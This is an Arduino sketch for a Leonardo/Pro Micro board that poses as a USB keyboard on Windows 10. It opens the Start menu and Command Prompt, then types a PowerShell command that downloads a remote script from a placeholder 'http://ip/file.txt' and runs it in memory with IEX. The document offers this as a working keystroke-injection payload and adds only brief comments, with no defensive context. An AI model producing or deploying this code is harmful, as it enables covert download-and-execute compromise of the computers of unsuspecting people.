/*This Arduino Sketch has been tested on Windows10 with Leonardo Pro Micro ATmega32U4 
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(500);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 1.5 second
  delay(1500);
  
  // Push CTRL + ESC buttons and release
  Keyboard.press(KEY_LEFT_CTRL);
  delay(20);
  Keyboard.press(KEY_ESC);
  delay(20);
  Keyboard.releaseAll();
  delay(20);
  
  //Open Command Prompt 
  Keyboard.print("cmd");
  delay(1000);
  typeKey(KEY_RETURN);
  delay(20);
  
  //Download the script and load it into memory
  Keyboard.print("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://ip/file.txt '))\"");
  delay(1500);
  typeKey(KEY_RETURN);
  delay(20);
  Keyboard.end();
}

  void loop() {}
